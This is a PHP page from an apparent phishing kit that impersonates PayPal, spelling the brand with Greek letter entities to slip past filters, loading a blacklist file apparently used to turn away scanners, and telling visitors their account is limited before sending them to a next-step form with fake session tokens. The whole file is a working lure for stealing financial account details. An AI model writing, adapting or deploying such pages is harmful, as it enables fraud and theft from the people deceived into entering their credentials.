<?php
include 'encrypter.php';

@ini_set('display_errors',0);
include 'BlackList.php';
?>
<html>
<head>
<title>Access &Rho;ay&Rho;al</title>
<link rel="stylesheet" href="./st/style.css">
<link rel="shortcut icon" link rel="logo-icon" href="./img/ppico.ico">
</head>
<body>
<div class="sec">
<img src="./img/exc.png" alt="" width="120px" style="margin-left: 53px;" />
<h2 style="font-size: 28px; font-weight: normal;"> Still using &Rho;ay&Rho;al? </h2>
<h4 style="font-weight: normal; color: #646464; margin-left: 5px;"> We'll Fix Your Account Limitations.</h4>
<form action="./personal.php?cmd=_account_limited=<?php echo md5(microtime());?>&session=<?php echo sha1(microtime()); ?>" method="POST">
<button type="submit" value="Continue" class="btncon" style="width: 320px; margin-left: -47px;">Next</button>
</form>
</div>
</body>
</html>
	  